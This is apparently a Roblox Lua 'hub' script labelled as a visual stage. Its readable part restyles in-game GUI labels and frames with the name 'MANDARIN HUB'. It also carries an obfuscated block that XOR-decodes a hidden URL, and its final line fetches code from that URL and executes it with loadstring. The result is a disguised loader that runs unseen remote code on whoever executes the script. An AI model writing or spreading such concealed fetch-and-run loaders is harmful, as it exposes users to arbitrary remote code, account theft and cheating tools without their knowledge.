
--[[ STAGE 2: VISUAL CORE ]]
local HyAkNPem_Vc4bNB9S6="\131\178\181\180\188\104\102\105\211\165\222\192\218\216\196\242\181\243\226\231\168\016\228\001\220\011\019\027\237\013\252\015\035"local mEcgZGlnv5LTYsRn0s=147 local xSLSvsmkXW9t=146 local qJsHgC6w9iLOKox7L9N6=1 local aZNjP_8cK6nKhaR=5 local El_iIQQk9O2dfXhP=17 local XUy869RjEQDqA150xQ1=false local J1bxAsKoHtd6sd3Hagka7=bit32 and bit32.bxor if not J1bxAsKoHtd6sd3Hagka7 then J1bxAsKoHtd6sd3Hagka7=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local wd62o_85UTMYxEDDeV4m6={}for W2mvryutGOAwt2vrfU=1,#HyAkNPem_Vc4bNB9S6 do local aB0u_ClU44bdVDg0wwKkb=string.byte(HyAkNPem_Vc4bNB9S6,W2mvryutGOAwt2vrfU)local qzlGpqP1bX3pYBRi7Ddz=(xSLSvsmkXW9t+(W2mvryutGOAwt2vrfU*aZNjP_8cK6nKhaR)+El_iIQQk9O2dfXhP)%256 if qJsHgC6w9iLOKox7L9N6==0 then aB0u_ClU44bdVDg0wwKkb=(aB0u_ClU44bdVDg0wwKkb-qzlGpqP1bX3pYBRi7Ddz)%256 wd62o_85UTMYxEDDeV4m6[W2mvryutGOAwt2vrfU]=string.char(J1bxAsKoHtd6sd3Hagka7(aB0u_ClU44bdVDg0wwKkb,mEcgZGlnv5LTYsRn0s))else aB0u_ClU44bdVDg0wwKkb=J1bxAsKoHtd6sd3Hagka7(aB0u_ClU44bdVDg0wwKkb,mEcgZGlnv5LTYsRn0s)wd62o_85UTMYxEDDeV4m6[W2mvryutGOAwt2vrfU]=string.char((aB0u_ClU44bdVDg0wwKkb-qzlGpqP1bX3pYBRi7Ddz)%256)end end local Gk8N3d2F7nfeFZ6=table.concat(wd62o_85UTMYxEDDeV4m6)if XUy869RjEQDqA150xQ1 then Gk8N3d2F7nfeFZ6=string.reverse(Gk8N3d2F7nfeFZ6)end local DgWXAQ_nV5vjSEIN2DGcVh=Gk8N3d2F7nfeFZ6
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(DgWXAQ_nV5vjSEIN2DGcVh))()
